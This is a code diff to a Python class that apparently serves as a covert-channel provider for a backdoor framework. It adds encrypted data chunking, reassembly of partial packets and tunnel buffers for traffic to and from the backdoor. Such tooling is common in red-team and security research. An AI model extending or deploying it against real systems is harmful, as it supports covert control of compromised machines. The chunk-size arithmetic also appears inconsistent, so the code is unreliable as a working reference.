@@ -24,22 +24,28 @@ class ShameleonProvider(threading.Thread):
     def __init__(self, secret: str):
         super().__init__()
         self._crypto = Fernet(secret)
+        self._packet_size: int = 0
         self._tunnels: dict[str, dict[str, Queue]] = {
             'system': {'in': Queue(), 'out': Queue()},
         }
+        self._buffers: dict[str, str] = {
+            'system': '',
+        }
+
+    def configure(self, packet_size: int):
+        self._packet_size = packet_size
 
     def run(self):
         while True:
-            # Send data
+            # Send chuncks
             buffer: list[str] = []
             for _, streams in self._tunnels.items():
                 while not streams['out'].empty():
-
                     buffer.append(streams['out'].get(block=False))
             if len(buffer) > 0:
                 self._send_payload(buffer)
                 time.sleep(1)  # TODO: Humanize and use backdoor config
-            # Receive data
+            # Receive chuncks
             incoming = self._get_payload()
             if len(incoming) > 0:
                 for tunnel_id, data in incoming:
@@ -71,14 +77,16 @@ class ShameleonProvider(threading.Thread):
         content = f"{tunnel_type}:{tunnel_uuid}"
         self.send_data("system", content.encode('utf-8'))
         while True:
-            data = self.receive_data("system")
-            if len(data) > 0:
-                decoded_data = data.decode('utf-8')
-                if decoded_data != 'OK':
-                    raise Exception('Impossible to create tunnel: %s', decoded_data)
-                print("[i] tunnel ID:", tunnel_uuid)
-                self._tunnels[tunnel_uuid] = {'in': Queue(), 'out': Queue()}
-                return tunnel_uuid
+            incomming = self.receive_data("system")
+            if len(incomming) == 0:
+                continue
+            decoded_data = incomming.decode('utf-8')
+            if decoded_data != 'OK':
+                raise Exception('Impossible to create tunnel: %s', decoded_data)
+            print("[i] tunnel ID:", tunnel_uuid)
+            self._tunnels[tunnel_uuid] = {'in': Queue(), 'out': Queue()}
+            self._buffers[tunnel_uuid] = ''
+            return tunnel_uuid
 
     def send_data(self, tunnel_id: str, data: bytes):
         """ Send data to the backdoor.
@@ -90,10 +98,12 @@ class ShameleonProvider(threading.Thread):
             tunnel_id (str): Unique identifier of the tunnel
             data (bytes): Data to send to the backdoor
         """
-        header = f"{tunnel_id}:"
-        encrypted_data = self._crypto.encrypt(data).decode('utf-8')
-        order = header + encrypted_data
-        self._tunnels[tunnel_id]['out'].put(order)
+        # Encryption
+        encrypted_data = self._crypto.encrypt(data)
+        # Split data
+        for chunk in self._split_data(encrypted_data, tunnel_id):
+            packet = f"{tunnel_id}:{chunk.decode('utf-8')}"
+            self._tunnels[tunnel_id]['out'].put(packet)
 
     def receive_data(self, tunnel_id: str) -> bytes:
         """ Receive data from the backdoor.
@@ -107,10 +117,16 @@ class ShameleonProvider(threading.Thread):
         Returns:
             bytes: Data received from the backdoor
         """
-        data: bytes = b''
+        data = b''
         while not self._tunnels[tunnel_id]['in'].empty():
             encrypted = self._tunnels[tunnel_id]['in'].get(block=False)
+            # Partial data
+            if encrypted[-1] == '!' and len(encrypted) == self._packet_size - len(tunnel_id) + 1:
+                self._buffers[tunnel_id] += encrypted[:-1]
+                continue
+            encrypted = self._buffers[tunnel_id] + encrypted
             decrypted = self._crypto.decrypt(encrypted.encode('utf-8'))
+            self._buffers[tunnel_id] = ''
             data += decrypted
         return data
 
@@ -126,6 +142,17 @@ class ShameleonProvider(threading.Thread):
         """
         encrypted = self._crypto.encrypt(data)
         self._tunnels[tunnel_id]['in'].put(encrypted)
+
+    def _split_data(self, data: bytes, tunel_id: str) -> list[bytes]:
+        if self._packet_size == 0:
+            return [data]
+        header_len = len(tunel_id) + 1
+        if header_len + len(data) <= self._packet_size:
+            return [data]
+        results: list[bytes] = []
+        for i in range(0, len(data), self._packet_size - 1):
+            results.append(data[i:i + self._packet_size - 1] + b'!')
+        return results
 
     # Must be implemented
     def _send_payload(self, data: list[str]):
@@ -149,7 +176,6 @@ class ShameleonProvider(threading.Thread):
         for submodule in iter_modules(cls._module_collection().__path__):
             if submodule.name in ('base',):
                 continue
-            print(submodule)
             module = __import__(
                 f"{cls._module_collection().__name__}.{submodule.name.lower()}",
                 fromlist=[''],
